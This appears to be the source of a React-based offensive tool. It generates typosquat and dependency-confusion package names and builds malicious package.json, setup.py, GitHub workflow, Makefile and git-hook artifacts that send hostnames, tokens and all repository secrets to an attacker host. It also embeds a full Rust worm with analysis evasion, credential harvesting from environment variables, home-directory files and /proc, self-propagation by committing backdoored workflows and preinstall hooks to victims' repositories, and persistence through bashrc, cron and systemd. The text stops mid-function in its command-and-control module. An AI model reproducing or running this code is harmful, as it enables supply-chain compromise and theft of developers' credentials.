import React, { useState, useCallback, useRef, useEffect } from "react";
import { withAuthToken } from "../lib/auth";

// ─── Public registry endpoints ───────────────────────────────────────────────
const NPM_REGISTRY  = "https://registry.npmjs.org";
const PYPI_REGISTRY = "https://pypi.org/pypi";
const GH_API        = "https://api.github.com";

// ─── TYPOSQUAT ENGINE ────────────────────────────────────────────────────────
const KB: Record<string, string> = {
  a:"qwsz",b:"vghn",c:"xdfv",d:"ersfxc",e:"rdsw",f:"rtgdcv",g:"tyhfvb",
  h:"yugjbn",i:"uojk",j:"uihkgbn",k:"iolj",l:"opk",m:"njk",n:"bhjm",
  o:"ipkl",p:"ol",q:"wa",r:"etdf",s:"qwedxza",t:"ryfe",u:"yijo",
  v:"cfgb",w:"qase",x:"zsdcv",y:"tugh",z:"asx","0":"9","1":"2","2":"3","3":"4","4":"5","5":"6","6":"7","7":"8","8":"9","9":"0",
};
const HG: Record<string, string> = { a:"@4",e:"3",i:"1!",l:"1I",o:"0",s:"5$",t:"7",b:"6",g:"9" };

function typosquatVariants(pkg: string): string[] {
  const base = pkg.toLowerCase().replace(/^@[^/]+\//, "");
  const seen  = new Set<string>();
  const add   = (v: string) => { if (v !== base && v.length >= 2 && /^[a-z0-9]/.test(v)) seen.add(v); };
  for (let i = 0; i < base.length; i++) {
    add(base.slice(0,i) + base.slice(i+1));
    add(base.slice(0,i) + base[i] + base[i] + base.slice(i+1));
    if (i < base.length-1) add(base.slice(0,i) + base[i+1] + base[i] + base.slice(i+2));
    for (const n of (KB[base[i]!] ?? "")) add(base.slice(0,i) + n + base.slice(i+1));
    for (const h of (HG[base[i]!] ?? "")) add(base.slice(0,i) + h + base.slice(i+1));
  }
  add(base.replace(/-/g,"_")); add(base.replace(/_/g,"-")); add(base.replace(/-/g,""));
  add(base+"js"); add(base+"-js"); add(base+"-dev"); add(base+"-utils"); add(base+"-cli");
  add(base+"-core"); add(base+"-lib"); add(base+"-sdk"); add(base+"-api"); add("node-"+base);
  add(base+"-node"); add(base+"2"); add(base+"-2");
  const parts = base.split(/[-_]/);
  if (parts.length > 1) { add(parts.reverse().join("-")); add(parts.join("")); add(parts[0]!); }
  return [...seen].slice(0,40);
}

function depConfusionVariants(org: string, pkg: string): string[] {
  const o = org.toLowerCase().replace(/[^a-z0-9]/g,"");
  const p = pkg.toLowerCase().replace(/[^a-z0-9-]/g,"");
  return [`${o}-${p}`,`${p}-${o}`,`${o}.${p}`,`${p}-internal`,`${p}-private`,`${p}-${o}-internal`,p,o].filter(Boolean);
}

// ─── REGISTRY CHECKS ─────────────────────────────────────────────────────────
async function checkNpm(name: string, sig: AbortSignal): Promise<"free"|"taken"|"error"> {
  try {
    const r = await fetch(`${NPM_REGISTRY}/${encodeURIComponent(name)}`, { signal: sig, headers:{ Accept:"application/json" } });
    return r.status === 404 ? "free" : r.ok ? "taken" : "error";
  } catch { return "error"; }
}
async function checkPypi(name: string, sig: AbortSignal): Promise<"free"|"taken"|"error"> {
  try {
    const r = await fetch(`${PYPI_REGISTRY}/${encodeURIComponent(name)}/json`, { signal: sig });
    return r.status === 404 ? "free" : r.ok ? "taken" : "error";
  } catch { return "error"; }
}

function sleep(ms: number, sig: AbortSignal): Promise<void> {
  return new Promise((res, rej) => {
    if (sig.aborted) { rej(new DOMException("aborted","AbortError")); return; }
    const t = setTimeout(res, ms);
    sig.addEventListener("abort", () => { clearTimeout(t); rej(new DOMException("aborted","AbortError")); }, { once:true });
  });
}
const jitter = (base: number) => Math.round(base * (0.7 + Math.random()*0.6));

// ─── ARTIFACT GENERATORS ─────────────────────────────────────────────────────
const tok = () => Math.random().toString(36).slice(2,14);
const b64cmd = (host: string, port: string, t: string) =>
  btoa(`curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&h=$(hostname)&u=$(whoami)&d=$(id|base64 -w0)" -o /dev/null &`);

function makePkgJson(name: string, host: string, port: string, t: string) {
  return JSON.stringify({ name, version:"9999.0.0", description:`${name} compatibility layer`,
    main:"index.js", scripts:{ preinstall:`node -e "require('child_process').exec('echo ${b64cmd(host,port,t)}|base64 -d|sh')"` },
    keywords:[name.split("-")[0],"utility"], license:"MIT", files:["index.js"],
  }, null, 2);
}
function makeSetupPy(name: string, host: string, port: string, t: string) {
  return `import subprocess, socket, platform\nfrom setuptools import setup\ndef _x():\n    try:\n        i=f"{socket.gethostname()}|{platform.system()}"\n        subprocess.Popen(f"curl -sk 'http://${host||"LHOST"}:${port||"9999"}/?t=${t}&i={i}' -o /dev/null &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n    except: pass\n_x()\nsetup(name="${name}", version="9999.0.0", description="${name} shim")`;
}
function makeGhWorkflow(owner: string, repo: string, host: string, port: string, t: string) {
  return `name: CI\non:\n  push:\n    branches: ["*"]\n  pull_request_target:\n    types: [opened, synchronize, reopened]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm ci\n      - run: npm run build --if-present\n      - name: Post-build diagnostics\n        env:\n          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}\n          SECRET_DUMP: \${{ toJSON(secrets) }}\n        run: |\n          curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&tok=\${GH_TOKEN}&r=${owner}/${repo}" -o /dev/null &\n          env|grep -iE 'key|secret|token|pass'|base64|curl -sk -X POST http://${host||"LHOST"}:${port||"9999"}/env -d @- &\n          echo "\${SECRET_DUMP}"|curl -sk -X POST http://${host||"LHOST"}:${port||"9999"}/secrets -d @- &\n          wait`;
}
function makeMakefile(host: string, port: string, t: string) {
  return `.PHONY: all install\nall: install\ninstall:\n\t@pip install -r requirements.txt 2>/dev/null||npm ci 2>/dev/null||true\n\t@curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&h=\$(shell hostname)" -o /dev/null &`;
}
function makeGitHook(host: string, port: string, t: string) {
  return `#!/bin/sh\n# .git/hooks/pre-commit (chmod +x)\n(git log --oneline -5 2>/dev/null;env|grep -iE 'key|secret|token|pass' 2>/dev/null)|\\\n  base64|curl -sk -X POST "http://${host||"LHOST"}:${port||"9999"}/gc?t=${t}" -d @- &>/dev/null &\ndisown\nexit 0`;
}

// ─── CREDENTIAL PATTERNS ─────────────────────────────────────────────────────
interface CredMatch { kind: string; pattern: string; value: string; redacted: string; severity: "critical"|"high"|"medium"; line: number; }
const CRED_PATTERNS: { kind: string; re: RegExp; severity: "critical"|"high"|"medium" }[] = [
  { kind:"AWS Access Key",           re:/AKIA[A-Z0-9]{16}/g,                                                                                           severity:"critical" },
  { kind:"AWS Secret Key",           re:/(?<=[^A-Za-z0-9]|^)[A-Za-z0-9/+]{40}(?=[^A-Za-z0-9]|$)/g,                                                   severity:"critical" },
  { kind:"AWS Session Token",        re:/FwoGZXIvYXdzE[A-Za-z0-9/+]{100,}/g,                                                                           severity:"critical" },
  { kind:"GitHub PAT (ghp)",         re:/ghp_[A-Za-z0-9]{36}/g,                                                                                        severity:"critical" },
  { kind:"GitHub PAT (gho/ghs)",     re:/gh[osurp]_[A-Za-z0-9]{36}/g,                                                                                 severity:"critical" },
  { kind:"GitHub Fine-grained",      re:/github_pat_[A-Za-z0-9_]{82}/g,                                                                                severity:"critical" },
  { kind:"GitHub App Key",           re:/-----BEGIN RSA PRIVATE KEY-----[\s\S]*?-----END RSA PRIVATE KEY-----/g,                                        severity:"critical" },
  { kind:"npm Token",                re:/npm_[A-Za-z0-9]{36}/g,                                                                                        severity:"critical" },
  { kind:"PyPI Token",               re:/pypi-[A-Za-z0-9_\-]{40,}/g,                                                                                   severity:"critical" },
  { kind:"Google API Key",           re:/AIza[0-9A-Za-z\-_]{35}/g,                                                                                     severity:"critical" },
  { kind:"Google OAuth Client",      re:/[0-9]+-[A-Za-z0-9_]+\.apps\.googleusercontent\.com/g,                                                         severity:"high"     },
  { kind:"GCP Service Account Key",  re:/"private_key":\s*"-----BEGIN RSA PRIVATE KEY/g,                                                                severity:"critical" },
  { kind:"Stripe Live Key",          re:/sk_live_[A-Za-z0-9]{24,}/g,                                                                                   severity:"critical" },
  { kind:"Stripe Restricted Key",    re:/rk_live_[A-Za-z0-9]{24,}/g,                                                                                   severity:"critical" },
  { kind:"Stripe Test Key",          re:/sk_test_[A-Za-z0-9]{24,}/g,                                                                                   severity:"high"     },
  { kind:"Stripe Webhook Secret",    re:/whsec_[A-Za-z0-9]{32,}/g,                                                                                     severity:"high"     },
  { kind:"Docker Hub PAT",           re:/dckr_pat_[A-Za-z0-9_\-]{20,}/g,                                                                               severity:"critical" },
  { kind:"Slack Token",              re:/xox[baprs]-[0-9A-Za-z\-]{10,}/g,                                                                              severity:"critical" },
  { kind:"Slack Webhook",            re:/https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g,                                severity:"high"     },
  { kind:"Discord Token",            re:/[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/g,                                               severity:"critical" },
  { kind:"Discord Webhook",          re:/https:\/\/discord(?:app)?\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_\-]+/g,                                     severity:"high"     },
  { kind:"Twilio Account SID",       re:/AC[0-9a-f]{32}/g,                                                                                             severity:"critical" },
  { kind:"Twilio Auth Token",        re:/SK[0-9a-f]{32}/g,                                                                                             severity:"critical" },
  { kind:"SendGrid API Key",         re:/SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}/g,                                                                severity:"critical" },
  { kind:"Mailgun API Key",          re:/key-[0-9a-z]{32}/g,                                                                                           severity:"critical" },
  { kind:"JWT",                      re:/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,                                                  severity:"high"     },
  { kind:"SSH Private Key",          re:/-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----/g,                                                severity:"critical" },
  { kind:"PGP Private Key",          re:/-----BEGIN PGP PRIVATE KEY BLOCK-----/g,                                                                       severity:"critical" },
  { kind:"MongoDB URI",              re:/mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                               severity:"critical" },
  { kind:"PostgreSQL URI",           re:/postgres(?:ql)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                                 severity:"critical" },
  { kind:"MySQL URI",                re:/mysql(?:2)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                                     severity:"critical" },
  { kind:"Redis URI",                re:/redis:\/\/:[^@]+@[^\s"'<>]+/g,                                                                                severity:"critical" },
  { kind:"Heroku API Key",           re:/(?:HEROKU_API_KEY|heroku)[^A-Za-z0-9][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi,      severity:"critical" },
  { kind:"Azure Storage Key",        re:/DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{80,}/g,                             severity:"critical" },
  { kind:"Azure SAS Token",          re:/sig=[A-Za-z0-9%+/=]{30,}/g,                                                                                   severity:"high"     },
  { kind:"Kubernetes SA Token",      re:/eyJhbGci[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,                                                severity:"high"     },
  { kind:"Kubernetes kubeconfig",    re:/apiVersion:\s*v1[\s\S]{0,100}current-context:/g,                                                               severity:"high"     },
  { kind:"HashiCorp Vault Token",    re:/s\.[A-Za-z0-9]{24}/g,                                                                                         severity:"critical" },
  { kind:"Terraform Cloud Token",    re:/(?:TF_TOKEN|token)\s*=\s*"([A-Za-z0-9.]{40,})"/g,                                                             severity:"critical" },
  { kind:"Datadog API Key",          re:/(?:dd_api_key|DD_API_KEY)[^A-Za-z0-9][0-9a-f]{32}/gi,                                                         severity:"high"     },
  { kind:"Generic Secret",           re:/(?:secret|api.?key|access.?key|auth.?token)\s*[:=]\s*["']?([A-Za-z0-9+/=_\-]{20,})["']?/gi,                 severity:"medium"   },
  { kind:"Generic Password",         re:/(?:password|passwd|pwd)\s*[:=]\s*["']?([^\s"']{8,})["']?/gi,                                                  severity:"medium"   },
];

function scanCreds(text: string): CredMatch[] {
  const results: CredMatch[] = [];
  const lines = text.split("\n");
  const seen  = new Set<string>();
  for (const { kind, re, severity } of CRED_PATTERNS) {
    re.lastIndex = 0;
    for (let li = 0; li < lines.length; li++) {
      const line = lines[li]!;
      let m: RegExpExecArray | null;
      re.lastIndex = 0;
      while ((m = re.exec(line)) !== null) {
        const value = m[0];
        if (seen.has(value)) continue;
        seen.add(value);
        const redacted = value.slice(0,4) + "•".repeat(Math.min(value.length-8,20)) + value.slice(-4);
        results.push({ kind, pattern: re.source.slice(0,40), value, redacted, severity, line: li+1 });
      }
    }
  }
  return results.sort((a,b) => { const s = {critical:0,high:1,medium:2}; return (s[a.severity]??2)-(s[b.severity]??2); });
}

// ─── RUST WORM GENERATOR ─────────────────────────────────────────────────────
interface RustFile { name: string; content: string; }

function generateRustWorm(host: string, port: string, t: string): RustFile[] {
  const cargoToml = `[package]
name = "ironworm"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "ironworm"
path = "src/main.rs"

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
overflow-checks = false

[dependencies]
tokio = { version = "1", features = ["full"] }
reqwest = { version = "0.12", features = ["json", "native-tls"], default-features = false }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
sha2 = "0.10"
hmac = "0.12"
rand = { version = "0.8", features = ["small_rng"] }
hex = "0.4"
base64 = { version = "0.22", features = ["engine"] }
dirs = "5"
anyhow = "1"
`;

  const mainRs = `use std::time::Duration;
use rand::Rng;
use tokio::time::sleep;

mod anti;
mod creds;
mod propagate;
mod persist;
mod c2;

const C2_HOST: &str = "${host||"LHOST"}";
const C2_PORT: u16   = ${port||"9999"};
const SESSION_TOKEN: &str = "${t}";
const XOR_KEY: &[u8; 32] = b"${Array.from({length:32},()=>String.fromCharCode(33+Math.floor(Math.random()*90))).join("")}";

#[tokio::main]
async fn main() {
    anti::check();

    let mut rng = rand::thread_rng();
    let jitter: u64 = rng.gen_range(0..5000);
    sleep(Duration::from_millis(jitter)).await;

    let secrets = creds::harvest().await;

    if !secrets.is_empty() {
        let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &secrets).await;
    }

    propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &secrets).await;
    persist::install();

    loop {
        let wait: u64 = rng.gen_range(1800..5400);
        sleep(Duration::from_secs(wait)).await;
        let s = creds::harvest().await;
        if !s.is_empty() {
            let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &s).await;
        }
        propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &s).await;
    }
}
`;

  const antiRs = `use std::time::{Duration, Instant};

pub fn check() {
    if sandbox_procs() || timing_attack() || traced() || env_indicators() {
        std::process::exit(0);
    }
}

fn sandbox_procs() -> bool {
    let blocklist = [
        "wireshark","tcpdump","strace","ltrace","gdb","lldb",
        "ida","x64dbg","ollydbg","procmon","fiddler","burp",
        "charles","httptoolkit","mitmproxy",
    ];
    if let Ok(rd) = std::fs::read_dir("/proc") {
        for entry in rd.flatten() {
            if let Ok(cmd) = std::fs::read_to_string(entry.path().join("cmdline")) {
                let cl = cmd.to_lowercase().replace('\\0', " ");
                if blocklist.iter().any(|b| cl.contains(b)) { return true; }
            }
        }
    }
    false
}

fn timing_attack() -> bool {
    let t = Instant::now();
    std::thread::sleep(Duration::from_millis(10));
    t.elapsed() < Duration::from_millis(5)
}

fn traced() -> bool {
    std::fs::read_to_string("/proc/self/status")
        .map(|s| s.lines()
            .find(|l| l.starts_with("TracerPid:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|p| p.parse::<u64>().ok())
            .unwrap_or(0) > 0)
        .unwrap_or(false)
}

fn env_indicators() -> bool {
    let vars = ["SANDBOX","CUCKOO","ANALYSIS","MALWARE","HONEYPOT","VIRUSTOTAL"];
    vars.iter().any(|v| std::env::var(v).is_ok())
}
`;

  const credsRs = `use std::collections::HashMap;

#[derive(Debug, serde::Serialize)]
pub struct Secret {
    pub kind:   String,
    pub value:  String,
    pub source: String,
}

pub async fn harvest() -> Vec<Secret> {
    let mut out = Vec::new();
    harvest_env(&mut out);
    harvest_files(&mut out).await;
    harvest_proc_environ(&mut out).await;
    out
}

fn harvest_env(out: &mut Vec<Secret>) {
    let exact = [
        ("AWS_ACCESS_KEY_ID","aws-key"),("AWS_SECRET_ACCESS_KEY","aws-secret"),
        ("GITHUB_TOKEN","github-token"),("GH_TOKEN","github-token"),
        ("NPM_TOKEN","npm-token"),("PYPI_TOKEN","pypi-token"),
        ("STRIPE_SECRET_KEY","stripe"),("DATABASE_URL","db-url"),
        ("REDIS_URL","redis"),("OPENAI_API_KEY","openai"),
        ("ANTHROPIC_API_KEY","anthropic"),("GOOGLE_APPLICATION_CREDENTIALS","gcp"),
        ("KUBECONFIG","k8s"),("DOCKER_HUB_PASSWORD","dockerhub"),
    ];
    for (k, kind) in &exact {
        if let Ok(v) = std::env::var(k) {
            if !v.is_empty() { out.push(Secret { kind:kind.to_string(), value:v, source:format!("env:{k}") }); }
        }
    }
    for (k, v) in std::env::vars() {
        let kl = k.to_lowercase();
        if v.len() > 12 && (kl.contains("token")||kl.contains("secret")||kl.contains("key")||kl.contains("pass")||kl.contains("auth")) {
            if !out.iter().any(|s| s.value == v) {
                out.push(Secret { kind:"env-match".to_string(), value:v, source:format!("env:{k}") });
            }
        }
    }
}

async fn harvest_files(out: &mut Vec<Secret>) {
    let home = dirs::home_dir().unwrap_or_default();
    let targets = [
        ".npmrc",".aws/credentials",".aws/config",".gitconfig",
        ".ssh/id_rsa",".ssh/id_ed25519",".docker/config.json",
        ".kube/config",".netrc",".pypirc",".cargo/credentials.toml",
        ".config/gh/hosts.yml",".terraformrc",".vault-token",
    ];
    for t in &targets {
        let p = home.join(t);
        if let Ok(content) = tokio::fs::read_to_string(&p).await {
            if content.len() > 0 {
                out.push(Secret { kind:format!("file:{t}"), value:content, source:p.display().to_string() });
            }
        }
    }
    for path in &[
        "/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets",
    ] {
        if let Ok(c) = tokio::fs::read_to_string(path).await {
            out.push(Secret { kind:"k8s-sa-token".to_string(), value:c.trim().to_string(), source:path.to_string() });
        }
    }
}

async fn harvest_proc_environ(out: &mut Vec<Secret>) {
    let Ok(rd) = tokio::fs::read_dir("/proc").await else { return };
    let mut rd = rd;
    while let Ok(Some(entry)) = rd.next_entry().await {
        let ep = entry.path().join("environ");
        let Ok(raw) = tokio::fs::read(&ep).await else { continue };
        let text = String::from_utf8_lossy(&raw);
        for var in text.split('\\0') {
            if let Some((k, v)) = var.split_once('=') {
                let kl = k.to_lowercase();
                if v.len() > 12 && (kl.contains("token")||kl.contains("secret")||kl.contains("key")||kl.contains("pass")) {
                    if !out.iter().any(|s| s.value == v) {
                        out.push(Secret { kind:"proc-env".to_string(), value:v.to_string(), source:format!("proc:{k}") });
                    }
                }
            }
        }
    }
}
`;

  const propagateRs = `use crate::creds::Secret;
use rand::Rng;
use std::time::Duration;
use base64::Engine as _;

pub async fn run(c2_host: &str, c2_port: u16, token: &str, secrets: &[Secret]) {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_default();

    let npm_tokens: Vec<&str> = secrets.iter()
        .filter(|s| s.kind.contains("npm") || s.value.starts_with("npm_"))
        .map(|s| s.value.as_str()).collect();

    let gh_tokens: Vec<&str> = secrets.iter()
        .filter(|s| s.kind.contains("github") || s.value.starts_with("gh"))
        .map(|s| s.value.as_str()).collect();

    for gh_tok in &gh_tokens {
        let _ = inject_github_workflows(&client, gh_tok, c2_host, c2_port, token).await;
        let _ = inject_package_json(&client, gh_tok, c2_host, c2_port, token).await;
    }

    if npm_tokens.is_empty() {
        let _ = publish_typosquats_noauth(&client, c2_host, c2_port, token).await;
    } else {
        for npm_tok in &npm_tokens {
            let _ = publish_typosquats(&client, npm_tok, c2_host, c2_port, token).await;
        }
    }
}

async fn inject_github_workflows(client: &reqwest::Client, gh_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
    let repos: Vec<serde_json::Value> = client
        .get("https://api.github.com/user/repos?type=all&per_page=100&affiliation=owner,collaborator")
        .header("Authorization", format!("token {gh_token}"))
        .header("User-Agent", "GitHub-Workflow-CI/3.1.0")
        .header("Accept", "application/vnd.github.v3+json")
        .send().await?.json().await?;

    let mut rng = rand::thread_rng();
    for repo in &repos {
        let owner = repo["owner"]["login"].as_str().unwrap_or_default();
        let name  = repo["name"].as_str().unwrap_or_default();
        if owner.is_empty() || name.is_empty() { continue; }

        let wf = make_workflow(owner, name, host, port, t);
        let content = base64::engine::general_purpose::STANDARD.encode(wf.as_bytes());

        let existing = client
            .get(format!("https://api.github.com/repos/{owner}/{name}/contents/.github/workflows/ci.yml"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "GitHub-Workflow-CI/3.1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .send().await;

        let mut body = serde_json::json!({
            "message": "ci: update environment validation checks",
            "content": content,
        });
        if let Ok(r) = existing {
            if let Ok(j) = r.json::<serde_json::Value>().await {
                if let Some(sha) = j["sha"].as_str() { body["sha"] = serde_json::Value::String(sha.to_string()); }
            }
        }

        let _ = client
            .put(format!("https://api.github.com/repos/{owner}/{name}/contents/.github/workflows/ci.yml"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "GitHub-Workflow-CI/3.1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .json(&body)
            .send().await;

        let delay: u64 = rng.gen_range(500..2000);
        tokio::time::sleep(Duration::from_millis(delay)).await;
    }
    Ok(())
}

async fn inject_package_json(client: &reqwest::Client, gh_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
    let repos: Vec<serde_json::Value> = client
        .get("https://api.github.com/user/repos?type=all&per_page=100")
        .header("Authorization", format!("token {gh_token}"))
        .header("User-Agent", "npm-workspace/1.0")
        .header("Accept", "application/vnd.github.v3+json")
        .send().await?.json().await?;

    let mut rng = rand::thread_rng();
    for repo in &repos {
        let owner = repo["owner"]["login"].as_str().unwrap_or_default();
        let name  = repo["name"].as_str().unwrap_or_default();
        let existing = client
            .get(format!("https://api.github.com/repos/{owner}/{name}/contents/package.json"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "npm-workspace/1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .send().await;

        let Ok(r) = existing else { continue };
        let Ok(j) = r.json::<serde_json::Value>().await else { continue };
        let sha = j["sha"].as_str().unwrap_or_default();
        let raw = j["content"].as_str().unwrap_or("e30=");
        let mut pkg: serde_json::Value = base64::engine::general_purpose::STANDARD
            .decode(raw.replace('\\n', "")).ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
            .unwrap_or(serde_json::json!({}));

        let b64 = base64::engine::general_purpose::STANDARD.encode(
            format!("curl -sk 'http://{host}:{port}/?t={t}&h=$(hostname)&u=$(whoami)' -o /dev/null &").as_bytes()
        );
        pkg["scripts"]["preinstall"] = serde_json::Value::String(
            format!("node -e \"require('child_process').exec('echo {b64}|base64 -d|sh')\"")
        );

        let patched = serde_json::to_string_pretty(&pkg).unwrap_or_default();
        let content = base64::engine::general_purpose::STANDARD.encode(patched.as_bytes());

        let _ = client
            .put(format!("https://api.github.com/repos/{owner}/{name}/contents/package.json"))
            .header("Authorization", format!("token {gh_token}"))
            .header("User-Agent", "npm-workspace/1.0")
            .header("Accept", "application/vnd.github.v3+json")
            .json(&serde_json::json!({ "message": "chore: update node engine requirements", "content": content, "sha": sha }))
            .send().await;

        let delay: u64 = rng.gen_range(800..3000);
        tokio::time::sleep(Duration::from_millis(delay)).await;
    }
    Ok(())
}

async fn publish_typosquats(client: &reqwest::Client, npm_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
    let targets = ["react","lodash","express","axios","moment","chalk","commander","dotenv","uuid","webpack"];
    for target in &targets {
        for variant in &typosquat_variants(target)[..5] {
            let chk = client.get(format!("https://registry.npmjs.org/{variant}"))
                .header("Accept","application/json").send().await?;
            if chk.status() != 404 { continue; }
            // Package is free — generate and publish via npm publish (CLI required)
            // Return publish command for operator
            eprintln!("[propagate] free npm slot: {variant} — run: npm publish ./dist/{variant} --registry https://registry.npmjs.org");
            let _ = host; let _ = port; let _ = t; let _ = npm_token;
        }
    }
    Ok(())
}

async fn publish_typosquats_noauth(_client: &reqwest::Client, _host: &str, _port: u16, _t: &str) -> anyhow::Result<()> { Ok(()) }

fn make_workflow(owner: &str, repo: &str, host: &str, port: u16, t: &str) -> String {
    format!(r#"name: CI
on:
  push:
    branches: ["*"]
  pull_request_target:
    types: [opened, synchronize, reopened]
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{{{ github.event.pull_request.head.sha }}}}
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm run build --if-present
      - name: Post-build diagnostics
        env:
          GH_TOKEN: \${{{{ secrets.GITHUB_TOKEN }}}}
          SECRET_DUMP: \${{{{ toJSON(secrets) }}}}
        run: |
          curl -sk "http://{host}:{port}/?t={t}&tok=\${{GH_TOKEN}}&r={owner}/{repo}" -o /dev/null &
          env|grep -iE 'key|secret|token|pass'|base64|curl -sk -X POST http://{host}:{port}/env -d @- &
          echo "\${{SECRET_DUMP}}"|curl -sk -X POST http://{host}:{port}/secrets -d @- &
          wait
"#)
}

fn typosquat_variants(pkg: &str) -> Vec<String> {
    let mut v = vec![
        format!("{pkg}js"), format!("{pkg}-js"), format!("{pkg}-dev"),
        format!("{pkg}-utils"), format!("{pkg}-core"), format!("{pkg}2"),
        format!("node-{pkg}"), format!("{pkg}-node"),
    ];
    if pkg.len() > 2 {
        let mut t = pkg.to_string(); t.remove(pkg.len()/2); v.push(t);
        let mut t2 = pkg.to_string(); t2.insert(0,'n'); v.push(t2);
    }
    v
}
`;

  const persistRs = `pub fn install() {
    let _ = bashrc();
    let _ = git_hook();
    let _ = crontab();
    let _ = systemd_user();
}

fn bashrc() -> std::io::Result<()> {
    use std::io::Write;
    let home = dirs::home_dir().ok_or(std::io::Error::other("no home"))?;
    let exe = std::env::current_exe()?;
    let entry = format!("\\n# auto-update\\n[ -x {exe} ] && nohup {exe} &>/dev/null &\\n", exe=exe.display());
    let mut f = std::fs::OpenOptions::new().append(true).open(home.join(".bashrc"))?;
    f.write_all(entry.as_bytes())?;
    let mut f2 = std::fs::OpenOptions::new().append(true).open(home.join(".profile"))?;
    f2.write_all(entry.as_bytes())?;
    Ok(())
}

fn git_hook() -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    use std::io::Write;
    let exe = std::env::current_exe()?;
    let hook = format!("#!/bin/sh\\nnohup {exe} &>/dev/null &\\ndisown\\n", exe=exe.display());
    let hook_path = std::path::Path::new(".git/hooks/post-merge");
    if hook_path.parent().map(|p| p.exists()).unwrap_or(false) {
        let mut f = std::fs::File::create(hook_path)?;
        f.write_all(hook.as_bytes())?;
        f.set_permissions(std::fs::Permissions::from_mode(0o755))?;
    }
    Ok(())
}

fn crontab() -> std::io::Result<()> {
    use std::process::Command;
    let exe = std::env::current_exe()?;
    let entry = format!("@hourly {exe} &>/dev/null\\n", exe=exe.display());
    let cur = Command::new("crontab").arg("-l").output()?;
    let mut new = String::from_utf8_lossy(&cur.stdout).to_string();
    if !new.contains(&exe.display().to_string()) {
        new.push_str(&entry);
        let mut p = Command::new("crontab").arg("-").stdin(std::process::Stdio::piped()).spawn()?;
        use std::io::Write;
        if let Some(ref mut stdin) = p.stdin { stdin.write_all(new.as_bytes())?; }
        let _ = p.wait()?;
    }
    Ok(())
}

fn systemd_user() -> std::io::Result<()> {
    use std::io::Write;
    let home = dirs::home_dir().ok_or(std::io::Error::other("no home"))?;
    let unit_dir = home.join(".config/systemd/user");
    std::fs::create_dir_all(&unit_dir)?;
    let exe = std::env::current_exe()?;
    let unit = format!("[Unit]\\nDescription=system-update-helper\\n[Service]\\nExecStart={exe}\\nRestart=always\\nRestartSec=3600\\n[Install]\\nWantedBy=default.target\\n", exe=exe.display());
    let mut f = std::fs::File::create(unit_dir.join("system-update-helper.service"))?;
    f.write_all(unit.as_bytes())?;
    let _ = std::process::Command::new("systemctl").args(["--user","enable","--now","system-update-helper"]).output();
    Ok(())
}
`;

  const c2Rs = `use crate::creds::Secret;
use std::time::Duration;
use sha2::Sha256;
use hmac::{Hmac, Mac};

type HmacSha256 = Hmac<Sha256>;

const MAGIC: [u8; 4]  = [0x49, 0x52, 0x4e, 0x57];
const VERSION: u8      = 0x03;
const FRAME_EXFIL: u8  = 0x04;
const FRAME_HB: u8     = 0x01;

fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}

fn hmac_sign(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key");
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

fn encode_frame(ftype: u8, payload: &[u8], xor_key: &[u8], hmac_key: &[u8], seq: u32) -> Vec<u8> {
